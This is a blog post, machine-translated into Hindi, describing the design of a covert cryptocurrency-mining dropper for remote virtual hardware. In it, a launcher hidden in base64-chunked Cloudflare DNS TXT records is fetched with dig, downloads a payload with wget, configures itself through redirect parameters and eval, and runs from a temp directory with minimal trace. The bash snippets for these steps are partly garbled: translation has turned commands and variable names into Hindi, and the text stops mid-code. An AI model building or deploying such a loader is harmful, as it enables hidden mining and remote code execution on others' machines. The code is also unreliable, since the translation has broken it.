<!DOCTYPE html><HTML lang=en ><meta charset=UTF-8 /><script type="application/ld+json">{"copyrightHolder":"untoreh","@id":"https://unto.re","url":"https://unto.re","copyrightYear":2021,"@context":"https://schema.org/","@type":"WebSite"}</script><script type="application/ld+json">{"audience":"cool people","url":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","author":"untoreh","description":"...How far are you willing to go for...pennies?","mentions":[],"accessModeSufficient":{"itemListElement":["textual","visual"],"description":"text and images","@type":"itemList"},"lastReviewed":"August 21, 2021","@type":"https://schema.org/WebPage","dateCreated":"August 21, 2021","@id":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"August 21, 2021","abstract":"...How far are you willing to go for...pennies?","headline":"Chronicles of a cryptonote dropper","creativeWorkStatus":"Published","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"datePublished":"August 21, 2021","inLanguage":"English","name":"Chronicles of a cryptonote dropper","identifier":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html"}</script><meta content="width=device-width, initial-scale=1" name=viewport /><link href="/libs/highlight/github.min.css" rel=stylesheet /><link href="/css/franklin.css" rel=stylesheet /><link href="/css/main.css" rel=stylesheet /><link href="/css/menu.css" rel=stylesheet /><link href="/css/pages.css" rel=stylesheet /><link href="/css/lunr.css" rel=stylesheet /><link href="/css/footer.css" rel=stylesheet /><link href="/css/responsive.css" rel=stylesheet /><link href="/css/animations.css" rel=stylesheet /><link href="/css/docco.css" rel=stylesheet /><link href="/css/flag-icon.min.css" rel=stylesheet /><link href="/assets/favicon.png" rel=icon /><title> क्रिप्टोनोट ड्रॉपर का इतिहास</title><script src="/libs/lunr/lunr.min.js"></script><script src="/libs/lunr/lunr_index.js"></script><script src="/libs/lunr/lunrclient.min.js"></script><script src="/libs/load.js"></script><script type="application/ld+json">{"@id":"https://unto.re/hi/posts/chronichles_of_a_cryptonote_dropper/index.html","url":"https://unto.re/hi/posts/chronichles_of_a_cryptonote_dropper/index.html","abstract":null,"headline":null,"keywords":null,"description":null,"mentions":null,"translator":{"url":"https://translate.google.com/","name":"Google","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"/home/fra/dev/blog/https://unto.re/"},"inLanguage":"hi","name":null,"@type":"https://schema.org/WebPage"}</script><body class=""><div class=masthead ><div class=masthead__inner-wrap ><div class=masthead__menu ><a class=site-title href="/hi/"></a><div class=author__wrap ><script type="application/ld+json">{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"description":"<ul>\n<li><p><strong>Name</strong>: Francesco Giannelli</p>\n\n<li><p><strong>Website</strong>: &#91;«https://unto.re»&#93;, the place where I put stuff I should remember...or forget</p>\n\n<li><p><strong>Location</strong>: south italy {{bio_link}}</p>\n\n<li><p><strong>Year</strong>: &#39;91</p>\n\n</ul>\n","image":"/assets/appa.png","name":"untoreh","@type":"https://schema.org/Person","email":"contact@unto.re"}</script><ul><li class=author__avatar onclick="toggleTheme()"><img alt=" अनतोरेह-प्रकाश" class=flip-front src="/assets/appa.png"/><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden=true class="fab fa-fw fa-twitter-square"></i></a><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden=true class="fab fa-fw fa-github"></i></a><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a><li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></ul></div><nav id=site-nav ><div class=horiz ><ul><li class="masthead__menu-item hvr-outline-in" id=lunrSearch ><form id=lunrSearchForm name=lunrSearchForm ><button class=search-button formaction="/search/index.html" type=submit value=Search ><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder="Search…" type=text /></form><li class="masthead__menu-item hvr-outline-in"><a href="/hi/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> पदों</a><li class="masthead__menu-item hvr-outline-in"><a href="/hi/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i> के बारे में</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class=langs-dropdown-wrapper ><i class="fas fa-language menu-icons"></i> Lang <div class=langs-dropdown-content id=langs-dropdown-menu ><ul id=lang-list ><a class=lang-link href="/ar/posts/chronichles_of_a_cryptonote_dropper" id=lang-ar ><span class="flag-icon flag-icon-sa"></span> अरबी</a><a class=lang-link href="/hi/bn/posts/chronichles_of_a_cryptonote_dropper" id=lang-bn ><span class="flag-icon flag-icon-bd"></span> बंगाली</a><a class=lang-link href="/hi/nl/posts/chronichles_of_a_cryptonote_dropper" id=lang-nl ><span class="flag-icon flag-icon-nl"></span> डच</a><a class=lang-link href="/hi/en/posts/chronichles_of_a_cryptonote_dropper" id=lang-en ><span class="flag-icon flag-icon-gb"></span> अंग्रेज़ी</a><a class=lang-link href="/hi/tl/posts/chronichles_of_a_cryptonote_dropper" id=lang-tl ><span class="flag-icon flag-icon-ph"></span> filipino</a><a class=lang-link href="/hi/fr/posts/chronichles_of_a_cryptonote_dropper" id=lang-fr ><span class="flag-icon flag-icon-fr"></span> फ्रेंच</a><a class=lang-link href="/hi/de/posts/chronichles_of_a_cryptonote_dropper" id=lang-de ><span class="flag-icon flag-icon-de"></span> जर्मन</a><a class=lang-link href="/hi/el/posts/chronichles_of_a_cryptonote_dropper" id=lang-el ><span class="flag-icon flag-icon-gr"></span> यूनानी</a><a class=lang-link href="/hi/hi/posts/chronichles_of_a_cryptonote_dropper" id=lang-hi ><span class="flag-icon flag-icon-in"></span> हिंदी</a><a class=lang-link href="/hi/it/posts/chronichles_of_a_cryptonote_dropper" id=lang-it ><span class="flag-icon flag-icon-it"></span> इतालवी</a><a class=lang-link href="/hi/ja/posts/chronichles_of_a_cryptonote_dropper" id=lang-ja ><span class="flag-icon flag-icon-jp"></span> जापानी</a><a class=lang-link href="/hi/jw/posts/chronichles_of_a_cryptonote_dropper" id=lang-jw ><span class="flag-icon flag-icon-id"></span> जावानीस</a><a class=lang-link href="/hi/ko/posts/chronichles_of_a_cryptonote_dropper" id=lang-ko ><span class="flag-icon flag-icon-kr"></span> कोरियाई</a><a class=lang-link href="/hi/ms/posts/chronichles_of_a_cryptonote_dropper" id=lang-ms ><span class="flag-icon flag-icon-ms"></span> मलायी</a><a class=lang-link href="/hi/zh/posts/chronichles_of_a_cryptonote_dropper" id=lang-zh ><span class="flag-icon flag-icon-cn"></span> मंदारिन चाइनिस</a><a class=lang-link href="/hi/pl/posts/chronichles_of_a_cryptonote_dropper" id=lang-pl ><span class="flag-icon flag-icon-pl"></span> पोलिश</a><a class=lang-link href="/hi/pt/posts/chronichles_of_a_cryptonote_dropper" id=lang-pt ><span class="flag-icon flag-icon-pt"></span> पुर्तगाली</a><a class=lang-link href="/hi/pa/posts/chronichles_of_a_cryptonote_dropper" id=lang-pa ><span class="flag-icon flag-icon-in"></span> पंजाबी</a><a class=lang-link href="/hi/ro/posts/chronichles_of_a_cryptonote_dropper" id=lang-ro ><span class="flag-icon flag-icon-ro"></span> रोमानियाई</a><a class=lang-link href="/hi/ru/posts/chronichles_of_a_cryptonote_dropper" id=lang-ru ><span class="flag-icon flag-icon-ru"></span> रूसी</a><a class=lang-link href="/hi/es/posts/chronichles_of_a_cryptonote_dropper" id=lang-es ><span class="flag-icon flag-icon-es"></span> स्पेनिश</a><a class=lang-link href="/hi/sv/posts/chronichles_of_a_cryptonote_dropper" id=lang-sv ><span class="flag-icon flag-icon-se"></span> स्वीडिश</a><a class=lang-link href="/hi/th/posts/chronichles_of_a_cryptonote_dropper" id=lang-th ><span class="flag-icon flag-icon-th"></span> थाई</a><a class=lang-link href="/hi/tr/posts/chronichles_of_a_cryptonote_dropper" id=lang-tr ><span class="flag-icon flag-icon-tr"></span> तुर्की</a><a class=lang-link href="/hi/uk/posts/chronichles_of_a_cryptonote_dropper" id=lang-uk ><span class="flag-icon flag-icon-ua"></span> यूक्रेनी</a><a class=lang-link href="/hi/ur/posts/chronichles_of_a_cryptonote_dropper" id=lang-ur ><span class="flag-icon flag-icon-pk"></span> उर्दू</a><a class=lang-link href="/hi/vi/posts/chronichles_of_a_cryptonote_dropper" id=lang-vi ><span class="flag-icon flag-icon-vn"></span> वियतनामी</a><a class=lang-link href="/hi/zu/posts/chronichles_of_a_cryptonote_dropper" id=lang-zu ><span class="flag-icon flag-icon-za"></span> ज़ुलु</a></ul></div></button></ul></div><button class=ham ><i class="fas fa-bars ham-icon"></i></button><div class=vert ><ul><li class="masthead__menu-item hvr-outline-in" id=lunrSearch ><form id=lunrSearchForm name=lunrSearchForm ><button class=search-button formaction="/search/index.html" type=submit value=Search ><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder="Search…" type=text /></form><li class="masthead__menu-item hvr-outline-in"><a href="/hi/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i> पदों</a><li class="masthead__menu-item hvr-outline-in"><a href="/hi/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i> के बारे में</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website&#39;s language"><button class=langs-dropdown-wrapper ><i class="fas fa-language menu-icons"></i> Lang <div class=langs-dropdown-content id=langs-dropdown-menu ><ul id=lang-list ><a class=lang-link href="/ar/posts/chronichles_of_a_cryptonote_dropper" id=lang-ar ><span class="flag-icon flag-icon-sa"></span> अरबी</a><a class=lang-link href="/hi/bn/posts/chronichles_of_a_cryptonote_dropper" id=lang-bn ><span class="flag-icon flag-icon-bd"></span> बंगाली</a><a class=lang-link href="/hi/nl/posts/chronichles_of_a_cryptonote_dropper" id=lang-nl ><span class="flag-icon flag-icon-nl"></span> डच</a><a class=lang-link href="/hi/en/posts/chronichles_of_a_cryptonote_dropper" id=lang-en ><span class="flag-icon flag-icon-gb"></span> अंग्रेज़ी</a><a class=lang-link href="/hi/tl/posts/chronichles_of_a_cryptonote_dropper" id=lang-tl ><span class="flag-icon flag-icon-ph"></span> filipino</a><a class=lang-link href="/hi/fr/posts/chronichles_of_a_cryptonote_dropper" id=lang-fr ><span class="flag-icon flag-icon-fr"></span> फ्रेंच</a><a class=lang-link href="/hi/de/posts/chronichles_of_a_cryptonote_dropper" id=lang-de ><span class="flag-icon flag-icon-de"></span> जर्मन</a><a class=lang-link href="/hi/el/posts/chronichles_of_a_cryptonote_dropper" id=lang-el ><span class="flag-icon flag-icon-gr"></span> यूनानी</a><a class=lang-link href="/hi/hi/posts/chronichles_of_a_cryptonote_dropper" id=lang-hi ><span class="flag-icon flag-icon-in"></span> हिंदी</a><a class=lang-link href="/hi/it/posts/chronichles_of_a_cryptonote_dropper" id=lang-it ><span class="flag-icon flag-icon-it"></span> इतालवी</a><a class=lang-link href="/hi/ja/posts/chronichles_of_a_cryptonote_dropper" id=lang-ja ><span class="flag-icon flag-icon-jp"></span> जापानी</a><a class=lang-link href="/hi/jw/posts/chronichles_of_a_cryptonote_dropper" id=lang-jw ><span class="flag-icon flag-icon-id"></span> जावानीस</a><a class=lang-link href="/hi/ko/posts/chronichles_of_a_cryptonote_dropper" id=lang-ko ><span class="flag-icon flag-icon-kr"></span> कोरियाई</a><a class=lang-link href="/hi/ms/posts/chronichles_of_a_cryptonote_dropper" id=lang-ms ><span class="flag-icon flag-icon-ms"></span> मलायी</a><a class=lang-link href="/hi/zh/posts/chronichles_of_a_cryptonote_dropper" id=lang-zh ><span class="flag-icon flag-icon-cn"></span> मंदारिन चाइनिस</a><a class=lang-link href="/hi/pl/posts/chronichles_of_a_cryptonote_dropper" id=lang-pl ><span class="flag-icon flag-icon-pl"></span> पोलिश</a><a class=lang-link href="/hi/pt/posts/chronichles_of_a_cryptonote_dropper" id=lang-pt ><span class="flag-icon flag-icon-pt"></span> पुर्तगाली</a><a class=lang-link href="/hi/pa/posts/chronichles_of_a_cryptonote_dropper" id=lang-pa ><span class="flag-icon flag-icon-in"></span> पंजाबी</a><a class=lang-link href="/hi/ro/posts/chronichles_of_a_cryptonote_dropper" id=lang-ro ><span class="flag-icon flag-icon-ro"></span> रोमानियाई</a><a class=lang-link href="/hi/ru/posts/chronichles_of_a_cryptonote_dropper" id=lang-ru ><span class="flag-icon flag-icon-ru"></span> रूसी</a><a class=lang-link href="/hi/es/posts/chronichles_of_a_cryptonote_dropper" id=lang-es ><span class="flag-icon flag-icon-es"></span> स्पेनिश</a><a class=lang-link href="/hi/sv/posts/chronichles_of_a_cryptonote_dropper" id=lang-sv ><span class="flag-icon flag-icon-se"></span> स्वीडिश</a><a class=lang-link href="/hi/th/posts/chronichles_of_a_cryptonote_dropper" id=lang-th ><span class="flag-icon flag-icon-th"></span> थाई</a><a class=lang-link href="/hi/tr/posts/chronichles_of_a_cryptonote_dropper" id=lang-tr ><span class="flag-icon flag-icon-tr"></span> तुर्की</a><a class=lang-link href="/hi/uk/posts/chronichles_of_a_cryptonote_dropper" id=lang-uk ><span class="flag-icon flag-icon-ua"></span> यूक्रेनी</a><a class=lang-link href="/hi/ur/posts/chronichles_of_a_cryptonote_dropper" id=lang-ur ><span class="flag-icon flag-icon-pk"></span> उर्दू</a><a class=lang-link href="/hi/vi/posts/chronichles_of_a_cryptonote_dropper" id=lang-vi ><span class="flag-icon flag-icon-vn"></span> वियतनामी</a><a class=lang-link href="/hi/zu/posts/chronichles_of_a_cryptonote_dropper" id=lang-zu ><span class="flag-icon flag-icon-za"></span> ज़ुलु</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title ><a href="/hi/posts/chronichles_of_a_cryptonote_dropper"> क्रिप्टोनोट ड्रॉपर का इतिहास</a></h1><blockquote id=page-description style="font-style: italic;"> ...आप कितनी दूर जाने को तैयार हैं...पैसा? </blockquote></div><div class=franklin-content ><p> मान लें कि आप मेरा करना चाहते हैं<a href="https://en.wikipedia.org/wiki/Cryptocurrency"> क्रिप्टोकरेंसी</a> रिमोट पर<em> आभासी</em> हार्डवेयर। आपको मेरे लिए कुछ खोजने की जरूरत है। रिमोट सर्वर का मतलब है, नहीं<a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit"> ASICS</a> या कार्य एल्गोरिदम का GPU प्रमाण, मूल रूप से केवल<a href="\posts/a-few-notes-on-proof-of-work"> सीपीयू के अनुकूल सिक्के</a>.</p><h2 id=the_software ><a class=header-anchor href="#the_software"> सॉफ्टवेयर</a></h2><p> खोजें और खोजें<a href="https://github.com/xmrig/xmrig"> खान में काम करनेवाला</a> , लेकिन यह वास्तव में अच्छा नहीं है, आप कुछ ऐसा चाहते हैं जिसे आप रिमोट से बेहतर ढंग से नियंत्रित कर सकें, इसलिए आप पाते हैं<a href="https://github.com/Bendr0id/xmrigCC"> एक और खनिक</a> . आप भी चाहते हैं<a href="https://github.com/Bendr0id/xmrigcc-proxy"> प्रतिनिधि</a> , क्योंकि कई कनेक्शन अल्पकालिक होंगे, आप नहीं चाहते<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack"> करने योग्य</a> आपका खनन पूल। यह भी एक<a href="https://github.com/search?q=tunnel"> सुरंग</a> अच्छा होगा।</p><h2 id=the_design ><a class=header-anchor href="#the_design"> परिरूप</a></h2><p> कुछ बॉटनेट कमांड देखने के लिए ब्लॉकचेन डेटा का उपयोग करते हैं,<a href="https://twitter.com/sarahjamielewis"> कोई</a> भी लगता है<a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968"> हारे हुए दांव</a> इस पर फिर से नहीं हो रहा है ... वैसे भी हम इतने परिष्कृत नहीं हैं, हम कुछ DNS रिकॉर्ड्स के साथ प्राप्त करेंगे जो एक स्क्रिप्ट को स्टोर करते हैं जो पेलोड को खींचता है जो एक अस्थायी निर्देशिका में स्वयं को निकालने और निष्पादित करता है<em> लगभग</em> इसकी स्थापना का कोई निशान नहीं है। यहाँ एक छोटा प्रवाह चार्ट है जो संरचना को दर्शाता है</p><img alt="" src="/assets/posts/output/payload.png"/><h2 id=launcher ><a class=header-anchor href="#launcher"> लांचर</a></h2><p> स्टार्टअप स्क्रिप्ट की बात यह है कि वह सुलभ और आसानी से अद्यतन करने योग्य हो ताकि वह समय की कसौटी पर खरी उतर सके। अद्यतन करने<a href="https://en.wikipedia.org/wiki/Domain_Name_System"> डीएनएस</a> रिकॉर्ड आसान है, और डीएनएस आखिरी चीज है जो नेटवर्क के भीतर बंद हो जाती है..क्योंकि आईपी पते याद रखना मुश्किल है ... इसलिए संभावना है कि यह ज्यादातर समय उपलब्ध होगा। आप देखते हैं कि हम कब हैं<em> परिनियोजन स्क्रिप्ट ला रहा है</em>हम वास्तव में पहले से ही कुछ तर्क चला रहे हैं, यह लॉन्चर स्क्रिप्ट है, इसे हमारे रिकॉर्ड देखने के लिए DNS प्रश्नों को करने की क्षमता की आवश्यकता है, DNS सर्वव्यापी हो सकता है लेकिन<a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/"> गड्ढा करना</a> नहीं है।</p><p> अगर हमें कोई दूसरा टूल डाउनलोड करना है तो यहां एक पहेली है<em> पेलोड डाउनलोड करने के लिए दूसरी स्क्रिप्ट डाउनलोड करने के लिए</em> हमें सिर्फ पेलोड डाउनलोड करना चाहिए! रक्षा में ... इस स्क्रिप्ट नृत्य को करने से अस्पष्टता बढ़ जाती है, लॉन्चर के केवल एक कार्यान्वयन को रखने की अनुमति मिलती है (रखरखाव, याय), अधिकांश समय की आवश्यकता नहीं होती है .. इसलिए हम एक सेवा भी करते हैं<a href="https://en.wikipedia.org/wiki/Standalone_program"> स्थिर रूप से जुड़ा हुआ</a> डीएनएस प्रश्नों को निष्पादित करने के लिए निष्पादन योग्य खोदें, या तो स्वयं होस्टिंग, या क्लाउड होस्टिंग द्वारा प्राप्त किए गए (हां फॉलबैक हैं, जैसे 3 या 4, क्योंकि क्लाउड सेवाओं में बहुत कम मुफ्त बैंडविड्थ है, और कुकीज़ या एक्सेस टोकन की भी आवश्यकता होती है ... वे बहुत स्क्रिप्ट हैं अमित्र, उद्देश्यपूर्ण रूप से, निश्चित रूप से)।</p><p> डीएनएस रिकॉर्ड में क्या है? हम प्रयोग कर रहे हैं<a href="https://en.wikipedia.org/wiki/TXT_record"> टेक्स्ट</a> रिकॉर्ड, एक कस्टम डोमेन पर (यहां भी कमियां)। TXT क्यों? वे वही होते हैं जो सबसे बड़ी मात्रा में डेटा स्टोर कर सकते हैं..आम तौर पर क्योंकि यह एक तरह का होता है<a href="https://www.ietf.org/rfc/rfc6763.txt"> अनुशंसित</a> इस पर निर्भर करते हुए<em> चीज़ें</em> . हम विशेष रूप से उपयोग कर रहे हैं<a href="https://www.cloudflare.com/"> मेघ ज्वाला</a> हमारे DNS फ़िडलिंग के लिए क्योंकि यह मुफ़्त है, और शहर का एकमात्र खिलाड़ी है (<em> अच्छी तरह से वास्तव में नहीं, लेकिन किसी भी अन्य वैकल्पिक ताल में बुद्धिमानी है</em> ) ऐसा होता है कि आप डेटा के कई टुकड़ों को स्टोर कर सकते हैं<em> वैसा ही</em> रिकॉर्ड...यह भ्रमित होने लगता है और कुछ विशिष्टताओं के लिए हाथापाई होने लगती है...(स्पर्शरेखा) Cloudflare<a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size"> अभ्यस्त</a> अनुमति<em> श्रृंखलित</em>TXT कुल ~ 9k बाइट्स रिकॉर्ड करता है, डॉक्स अब ~ 2k बाइट्स बताता है, परिवर्तन से पहले मैं ~ 6k का उपयोग कर रहा था, मुझे लगता है, और स्क्रिप्ट को असम्पीडित कर रहा था, उसके बाद मुझे स्क्रिप्ट को पतला करना पड़ा और हाथ से पहले इसे संपीड़ित करना पड़ा (वास्तव में मैं एक का उपयोग करने की कोशिश की<a href="https://freedns.afraid.org/"> फ़्रीडन्स</a> प्रदाता, मुझे एक दिन के भीतर प्रतिबंधित कर दिया गया था, यह अनुमान लगाते हुए कि उनके पास सख्त नो-फैट TXT रिकॉर्ड नीति है), हालांकि gzip संपीड़न पाइप के अनुकूल नहीं है और अभी भी समस्याएं पैदा कर रहा था, इसलिए मुझे बिना संपीड़न के स्क्रिप्ट को रटना करने का प्रबंधन करना पड़ा ( अंत स्पर्शरेखा)।</p><p> हम इसे कैसे स्टोर करते हैं? TXT रिकॉर्ड केवल अल्फ़ान्यूमेरिक स्ट्रिंग्स का समर्थन करते हैं, नहीं<a href="https://en.wikipedia.org/wiki/Null_character"> एनयूएल</a> , इसलिए हमें इसे एक गैर-शून्य एन्कोडिंग में लपेटना होगा,<a href="https://en.wikipedia.org/wiki/Base64"> बेस 64</a> इस बाधा को पूरा करता है, और क्योंकि हम भंडारण कर रहे हैं<em> श्रृंखलित</em> TXT रिकॉर्ड, हमें आउटपुट को चंक करना होगा, क्योंकि हम शेल स्टफ का उपयोग कर रहे हैं, यह के माध्यम से किया जाता है<code>-w</code> ध्वज, बिजीबॉक्स पर ऐसा ध्वज पुराने संस्करणों पर अनुपस्थित (या ऑप्ट-इन) हुआ करता था जो कष्टप्रद था, एक विकल्प यह है कि ओपनएसएल के साथ बंडल किए गए एन्कोडर का उपयोग किया जाए,<code>openssl enc -base64</code>.</p><p> अब जब हम जानते हैं कि हमारी परिनियोजन स्क्रिप्ट को कैसे संग्रहीत किया जाता है, तो हम इसे या तो स्टोर करते हैं<a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md"> सीएफ क्लि</a> या मैन्युअल रूप से। हम इसे कैसे खींचते हैं? हमने उल्लेख किया है कि हमें बिंदुटिल्स की आवश्यकता है या हमारे अपने<code>dig</code> ...सर्विंग एंडपॉइंट चुनने के बाद, हम इसे डाउनलोड करना चाहते हैं, जो उपलब्ध है वह आमतौर पर है<a href="https://www.gnu.org/software/wget/"> wget</a> या<a href="https://curl.se/"> कर्ल</a> , wget अधिक बार पूर्वस्थापित पाया जाता है, हालांकि बिजीबॉक्स केवल गतिशील पुस्तकालयों के साथ tls समर्थन प्रदान करता है, इसलिए आपको यह सुनिश्चित करना होगा कि समापन बिंदु http की सेवा कर रहा है या आपकी उपयोगिता है<code>wget</code> ग्नू-बर्तनों से</p><pre><code class="bash hljs"><span class=hljs-comment ># the wget command</span>
wget -t 2 -T 10 -q -i- -O- &gt; <span class=hljs-variable >$filename</span> &lt;&lt;&lt; <span class=hljs-string >"<span class=hljs-variable > $digurl</span>"</span></code></pre><p> इसका मतलब है कोशिश<code>-t2</code> समय प्रतीक्षा<code>-T10</code> सेकंड जा रहा है<code>-q</code> से शांत पढ़ना<code>-i-</code> स्टडिन (<code>$digurl</code> ) और लिखने के लिए<code>-O-</code> स्टडआउट (<code>$filename</code>) यह आदेश प्रकट नहीं करता है कि हम पहली नज़र में क्या डाउनलोड कर रहे हैं। हम उसी कारण से अन्य शेल कमांड के साथ बहुत सावधान रहने जा रहे हैं, या शेल के साथ चिपके हुए हैं (<a href="https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29"> दे घुमा के</a> ) बिल्ट-इन जहां संभव हो। इस बात का भी ध्यान रखें कि आप अपने निष्पादन योग्य कहाँ से डाउनलोड कर रहे हैं, आप यह सुनिश्चित करना चाहते हैं कि आप उन्हें निष्पादित कर सकें, क्योंकि कुछ माउंट पॉइंट, विशेष रूप से कंटेनरों में और<code>tmp</code> रास्ते हैं<code>noexec</code> . अब जब हमारे पास अपना डीएनएस क्वेरीिंग टूल है तो हम अपने रिकॉर्ड प्राप्त करते हैं</p><pre><code class="bash hljs">dig txt <span class=hljs-variable >${record}</span>.<span class=hljs-variable >${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable >$dnsserver</span></code></pre><p> झंडे यहाँ स्व व्याख्यात्मक हैं,<code>+short</code>  इसका सीधा सा मतलब है कि हम केवल डेटा में ही रुचि रखते हैं, ताकि हमें आउटपुट को पार्स न करना पड़े। DNS सर्वर को निर्दिष्ट करना महत्वपूर्ण है, जैसे google (<code>8.8.8.8</code> ) या क्लाउडफ्लेयर (<code>1.1.1.1</code> ) क्योंकि कई वातावरण डिफ़ॉल्ट रूप से अपने स्वयं के डीएनएस सर्वर पर डीएनएस प्रश्नों को पुनर्निर्देशित या प्रॉक्सी करते हैं। खंडित स्क्रिप्ट प्राप्त करने के बाद हम इसे डिकोडिंग के लिए तैयार करने के लिए उद्धरण और रिक्त स्थान से निपटते हैं</p><pre><code class="bash hljs">data=<span class=hljs-variable >${data//\"}</span><span class=hljs-comment ># remove quotes</span>
data=<span class=hljs-variable >${data// }</span><span class=hljs-comment ># remove whitespace</span><span class=hljs-built_in >declare</span> -a ar_data
<span class=hljs-keyword >for</span> l <span class=hljs-keyword >in</span><span class=hljs-variable >$data</span>; <span class=hljs-keyword >do</span>
    ar_data[<span class=hljs-variable >${l:0:1}</span>]=<span class=hljs-variable >${l:1}</span><span class=hljs-comment ># iterate over each line and remove the first characther</span><span class=hljs-keyword >done</span>
data=<span class=hljs-variable >${ar_data[@]}</span><span class=hljs-comment ># join all the lines</span>
data=<span class=hljs-variable >${data// }</span><span class=hljs-comment ># ensure joining didn't add whitespace</span><span class=hljs-comment ># decode</span>
launcher=$(<span class=hljs-built_in >echo</span><span class=hljs-string >"<span class=hljs-variable > $लांचर</span>"</span> | <span class=hljs-variable > $b64</span>  -डी -डब्ल्यू<span class=hljs-variable > $चंकसाइज</span>)</code></pre><p> क्या हुआ अगर अब हम<em> फिर भी</em> हमारे पास लांचर नहीं है? DNS गड़बड़ है, हम एक फ़ॉलबैक चाहते हैं, लॉन्चर स्क्रिप्ट को सीधे लाने के लिए एक सबडोमेन सेट अप करने देता है। अपनी स्क्रिप्ट का मूल्यांकन करने से पहले हम इसे कुछ चरों के साथ अनुकूलित करना चाहते हैं, फिर से एक NAME=VALUE चरों की सूची को संग्रहीत करने और इसे पार्स करने के लिए एक TXT रिकॉर्ड का उपयोग करने देता है। वेरिएबल्स के लिए एक फॉलबैक भी है, क्लाउडफ्लेयर यूआरएल के आधार पर रीडायरेक्ट की पेशकश करता है, ये रीडायरेक्ट पेश किए जाते हैं<em> इससे पहले</em> गंतव्य, इसलिए हमें एक समापन बिंदु की आवश्यकता नहीं है, हम केवल रेगेक्स आधारित पुनर्निर्देशन नियमों को एक काल्पनिक समापन बिंदु पर कॉन्फ़िगर करना चाहते हैं, जिसमें हम रुचि रखते हैं वह url के पैरामीटर हैं<code>?NAME=VALUE&amp;NAME2=VALUE2...</code>, ताकि हम अपने लॉन्चर को केवल रीडायरेक्ट यूआरएल को बदलकर पैरामीट्रिज कर सकें, हमेशा कोड को उद्धृत करने और भागने पर ध्यान दें</p><pre><code class="bash hljs"><span class=hljs-comment >## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in >echo</span><span class=hljs-string >"<span class=hljs-variable > $टोकन_यूआरएल</span>"</span>  | wget -t 1 -T 3 -q -i- -S 2&gt;&amp;1 | ग्रेप -एम1<span class=hljs-string > 'स्थान'</span> )
pl_vars=<span class=hljs-variable > ${pl_vars#*\/}</span> 
pl_vars=<span class=hljs-variable > ${pl_vars//\"&amp;/\" }</span> 
pl_vars=<span class=hljs-variable > ${pl_vars//%3F/\?}</span></code></pre><p> Wget<code>-S</code> उस रीडायरेक्ट url को प्रिंट करता है जिसमें हम पार्सिंग के लिए रुचि रखते हैं। पैरामीटर और स्क्रिप्ट होने पर, हम एक फ़ाइल पर उन्हें लिखने वाले चर का मूल्यांकन करते हैं</p><pre><code class="bash hljs"><span class=hljs-built_in >eval</span><span class=hljs-string >"<span class=hljs-variable > $pl_vars</span>"</span><span class=hljs-built_in > गूंज</span><span class=hljs-string >"export \
<span class=hljs-variable > $pl_vars</span> \
<span class=hljs-variable > $ENV_VARS</span> \
